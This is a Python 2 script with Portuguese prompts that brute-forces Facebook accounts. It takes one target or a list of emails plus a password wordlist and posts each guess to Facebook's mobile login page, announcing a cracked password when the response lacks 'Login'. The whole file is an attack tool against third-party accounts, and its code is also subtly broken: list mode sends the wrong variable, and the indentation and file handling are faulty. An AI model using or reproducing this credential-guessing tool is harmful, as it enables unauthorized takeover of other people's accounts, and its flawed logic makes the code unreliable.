#!/usr/bin/env python
# -*- coding: utf-8 -*-


try:
    from  requests import post as rq
except ImportError:
    print "Por Favor verifique se o modulo 'requests' esta instalado corretamente"
    exit()
   
import os
from time import sleep

B, R, Y, G, N = '\33[94m', '\033[91m', '\33[93m', '\033[1;32m', '\033[0m'


header = {"User-agent":"Mozilla/5.0 (Linux; Android 6.0; LG-K350 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.107 Mobile Safari/537.36"}


print("1 - Lista de emails")
print("2 - Apenas um email")
print("")
option = int(raw_input(">> "))

if option == 1:
	file_users_dir = raw_input("Lista de emails,Ex:'/root/Desktop/emails.txt'")
	list_users = []
	users = open(file_users_dir,'r')
	
	for lst in users.readlines():
		w = lst.rstrip()
		list_users.append(w)
	
elif option == 2:
    user = raw_input('Digite o ID, UserName ou Email: ')
    list_users = []
    list_users.append(user)
    
else:
	print('A Opcão selecionada não está disponivel')
	exit()
	
passw = raw_input('Lista de Palavras,Ex: "/root/Desktop/wordlist.txt "')


def entrar():
	try:
		os.system('clear')
		Banner()
		print('{0}Aguarde!'.format(Y))
		sleep(2)
		ler = open(passw,'r')
		for emails in list_users:
		    print("{0}{1}".format(Y,emails))
		    
		    for pwd in ler.readlines():
			    senha = pwd.rstrip()
			    request = rq("https://m.facebook.com/login.php?refsrc=https%3A%2F%2Fwww.facebook.com%2Flogin.php&lwv=100&refid=9",data={"email":str(user),"pass":str(senha),"login":"Entrar"})
		    
			    print('{0}[-] {1}Decifrando Senha ------> {2}'.format(R,N,senha))
                if not "Login" in request.text:
                    print('\n{0}#####################################################'.format(N))
                    print('{0} [+] {1}Senha Decifrada -----> {2}{3}'.format(G,Y,G,senha) )
                    print('{0}######################################################'.format(N))
                    exit()

	
	except IOError:
		print("Arquivo nao encontrado")
	
	except KeyboardInterrupt:
		print('\n{0}Saindo'.format(R))
		sleep(3)

	except Exception:
		print('{0}[-] Por favor verifique a Conexão'.format(R))
	

def Banner():
	with open("banner","r") as bnr:
		print bnr.read()


if __name__ == '__main__':
	entrar()
